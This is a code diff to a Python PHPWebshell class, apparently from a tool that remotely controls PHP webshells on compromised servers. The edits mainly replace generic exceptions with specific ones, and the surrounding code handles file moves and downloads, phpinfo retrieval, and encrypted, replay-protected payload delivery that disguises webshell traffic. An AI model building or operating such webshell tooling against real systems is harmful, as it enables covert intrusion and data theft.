@@ -404,7 +404,7 @@ class PHPWebshell(PHPSessionInterface):
         try:
             result = json.loads(json_result)
         except json.JSONDecodeError as exc:
-            raise exceptions.UnknownError("JSON解析失败: " + json_result) from exc
+            raise exceptions.PayloadOutputError("JSON解析失败: " + json_result) from exc
         result = [
             DirectoryEntry(
                 name=item["name"],
@@ -468,13 +468,13 @@ class PHPWebshell(PHPSessionInterface):
         )
         result = await self.submit(php_code)
         if result == "WRONG_NOT_EXIST":
-            raise exceptions.FileError("目标不存在")
+            raise exceptions.FileError("文件不存在")
         if result == "WRONG_NO_PERMISSION":
             raise exceptions.FileError("没有权限移动这个文件")
         if result == "FAILED":
-            raise exceptions.UnknownError("因未知原因移动失败")
+            raise exceptions.FileError("因未知原因移动文件失败")
         if result != "SUCCESS":
-            raise exceptions.UnknownError("目标没有反馈移动成功")
+            raise exceptions.FileError("文件没有反馈移动成功")
 
     async def upload_file(
         self, filepath: str, content: bytes, callback: t.Union[t.Callable, None] = None
@@ -574,16 +574,18 @@ class PHPWebshell(PHPSessionInterface):
         try:
             filesize = json.loads(filesize_text)
         except json.decoder.JSONDecodeError as exc:
-            raise exceptions.UnknownError(
+            raise exceptions.PayloadOutputError(
                 "获取文件大小失败，打印的文件大小不是一个数字: " + repr(filesize_text)
             ) from exc
 
         if filesize is False:
-            raise exceptions.UnknownError(
+            raise exceptions.PayloadOutputError(
                 "虽然文件存在且可以读取，但获取文件大小仍然失败"
             )
         if not isinstance(filesize, int):
-            raise exceptions.UnknownError("获取文件大小失败，文件大小不是一个整数")
+            raise exceptions.PayloadOutputError(
+                "获取文件大小失败，文件大小不是一个整数"
+            )
 
         sem = asyncio.Semaphore(self.max_coro)
         chunk_size = self.chunk_size
@@ -632,12 +634,12 @@ class PHPWebshell(PHPSessionInterface):
             elif chunk == "WRONG_NO_PERMISSION":
                 raise exceptions.FileError("没有读取权限")
             elif chunk == "WRONG_UNKNOWN":
-                raise exceptions.UnknownError("未知错误，下载文件失败")
+                raise exceptions.FileError("未知错误，下载文件失败")
             try:
                 result += base64.b64decode(chunk)
             except Exception as exc:
-                raise exceptions.UnknownError(
-                    "读取文件失败，webshell返回的不是正确的base64"
+                raise exceptions.PayloadOutputError(
+                    "解码失败，webshell返回的不是正确的base64"
                 ) from exc
 
         return result
@@ -654,9 +656,9 @@ class PHPWebshell(PHPSessionInterface):
             result = await self.submit(
                 f"decoder_echo('{first_string}' . '{second_string}');"
             )
-        except exceptions.NetworkError:
+        except exceptions.TargetError:
             return False
-        return (first_string + second_string) in result
+        return first_string + second_string == result
 
     async def get_basicinfo(self) -> t.List[BasicInfoEntry]:
         json_result = await self.submit(GET_BASIC_INFO_PHP)
@@ -675,7 +677,7 @@ class PHPWebshell(PHPSessionInterface):
             ]
             return result
         except json.JSONDecodeError as exc:
-            raise exceptions.UnknownError("解析目标返回的JSON失败") from exc
+            raise exceptions.PayloadOutputError("解析目标返回的JSON失败") from exc
 
     async def download_phpinfo(self) -> bytes:
         """获取当前的phpinfo文件"""
@@ -683,7 +685,7 @@ class PHPWebshell(PHPSessionInterface):
         try:
             return base64.b64decode(b64_result)
         except BinasciiError as exc:
-            raise exceptions.UnknownError("base64解码接收到的数据失败") from exc
+            raise exceptions.PayloadOutputError("base64解码接收到的数据失败") from exc
 
     def sessionize_payload_wrapper(
         self, submitter: t.Callable[[str], t.Awaitable[str]]
@@ -695,7 +697,7 @@ class PHPWebshell(PHPSessionInterface):
             for payload_part in payloads:
                 result = await submitter(payload_part)
                 if result == "PAYLOAD_SESSIONIZE_UNEXIST":
-                    raise exceptions.UnknownError(
+                    raise exceptions.TargetRuntimeError(
                         "Session中不存在payload，是不是不支持Session？"
                     )
             assert result is not None
@@ -715,7 +717,7 @@ class PHPWebshell(PHPSessionInterface):
             try:
                 key = int(key)
             except Exception as exc:
-                raise exceptions.UnknownError(
+                raise exceptions.TargetRuntimeError(
                     "部署反重放失败，无法从服务器获得对应的key"
                 ) from exc
             payload_b64 = base64_encode(payload)
@@ -737,7 +739,7 @@ class PHPWebshell(PHPSessionInterface):
             )
             result = await submitter(code)
             if result == "WRONG_BAD_KEY":
-                raise exceptions.UnknownError("部署反重放失败，key不一致")
+                raise exceptions.TargetRuntimeError("部署反重放失败，key不一致")
             return result
 
         return wrap
@@ -773,11 +775,11 @@ class PHPWebshell(PHPSessionInterface):
                 .strip()
             )
             if key_encrypted == "WRONG_NO_OPENSSL":
-                raise exceptions.UnknownError("目标不支持OpenSSL扩展！")
+                raise exceptions.TargetRuntimeError("目标不支持OpenSSL扩展！")
             try:
                 key = private_decrypt_rsa(key_encrypted)
             except Exception as exc:
-                raise exceptions.UnknownError(
+                raise exceptions.TargetRuntimeError(
                     "部署加密失败，无法从服务器获得对应的key"
                 ) from exc
             payload_enc = encrypt_aes256_cbc(key, payload.encode("utf-8"))
@@ -822,7 +824,7 @@ class PHPWebshell(PHPSessionInterface):
                 .replace("    ", "")
             )
             if result_enc == "WRONG_NO_OPENSSL":
-                raise exceptions.UnknownError("目标不支持openssl")
+                raise exceptions.TargetRuntimeError("目标不支持openssl")
             if not result_enc:
                 return ""
             try:
@@ -830,7 +832,7 @@ class PHPWebshell(PHPSessionInterface):
                 result = decrypt_aes256_cbc(key, result_enc).decode("utf-8")
                 return result
             except Exception as exc:
-                raise exceptions.UnknownError("解密失败") from exc
+                raise exceptions.PayloadOutputError("解密失败") from exc
 
         return wrap
 
@@ -851,23 +853,21 @@ class PHPWebshell(PHPSessionInterface):
         payload = self.encode(payload)
         status_code, text = await self.submit_raw(payload)
         if status_code == 404:
-            raise exceptions.UnknownError(
-                f"受控端返回404, 没有这个webshell: {status_code}"
+            raise exceptions.TargetUnreachable(
+                f"状态码404, 没有这个webshell: {status_code}"
             )
         if status_code != 200:
-            raise exceptions.UnknownError(
-                f"受控端返回了不正确的HTTP状态码: {status_code}"
-            )
+            raise exceptions.TargetUnreachable(f"HTTP状态码不正确: {status_code}")
         if "POSTEXEC_FAILED" in text:
-            raise exceptions.UnknownError("payload被执行，但运行失败")
+            raise exceptions.TargetRuntimeError("payload抛出错误")
         idx_start = text.find(start)
         if idx_start == -1:
-            raise exceptions.UnknownError(
+            raise exceptions.PayloadOutputError(
                 "找不到输出文本的开头，也许webshell没有执行代码？"
             )
         idx_stop_r = text[idx_start:].find(stop)
         if idx_stop_r == -1:
-            raise exceptions.UnknownError("找不到输出文本的结尾")
+            raise exceptions.PayloadOutputError("找不到输出文本的结尾")
         idx_stop = idx_stop_r + idx_start
         output = text[idx_start + len(start) : idx_stop]
         output = self.decode(output)
